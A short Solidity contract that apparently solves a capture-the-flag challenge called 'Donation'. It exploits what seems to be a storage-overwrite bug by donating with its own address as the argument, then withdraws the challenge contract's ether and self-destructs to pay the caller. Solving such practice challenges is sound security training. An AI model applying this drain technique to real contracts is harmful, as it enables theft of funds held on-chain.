pragma solidity ^0.4.21;

import "./DonationChallenge.sol";

contract DonationSolver {
    DonationChallenge public challenge;
    uint256 scale = 10**18 * 1 ether;

    function() public payable {}

    function DonationSolver(address _challenge) public payable {
        challenge = DonationChallenge(_challenge);
        uint donation = uint256(address(this));
        challenge.donate.value(donation / scale)(donation);
        challenge.withdraw();
        require(challenge.isComplete());
        selfdestruct(msg.sender);
    }

}
